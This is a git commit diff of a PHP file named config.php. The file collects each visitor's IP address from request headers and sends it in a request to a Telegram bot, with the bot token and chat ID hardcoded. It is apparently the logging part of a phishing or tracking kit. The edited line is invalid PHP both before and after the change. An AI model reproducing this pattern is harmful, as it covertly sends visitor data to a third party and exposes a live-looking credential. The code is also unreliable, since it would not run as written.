76907606706ae85b62988a55f66f959ff24138b2
AI22AK47 <94799989+AI22AK47@users.noreply.github.com>
2022-11-07 11:42:16 +0600

    Update config.php

--- config.php
+++ config.php
@@ -5,7 +5,7 @@ getenv('HTTP_X_FORWARDED')?:
 getenv('HTTP_FORWARDED_FOR')?:
 getenv('HTTP_FORWARDED')?:
 getenv('REMOTE_ADDR');
-    $text2= CLIENT IP IS: $ip;
+    $text2= $_POST("CLIENT IP IS: $ip");
         $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text2");    
     
 ?>
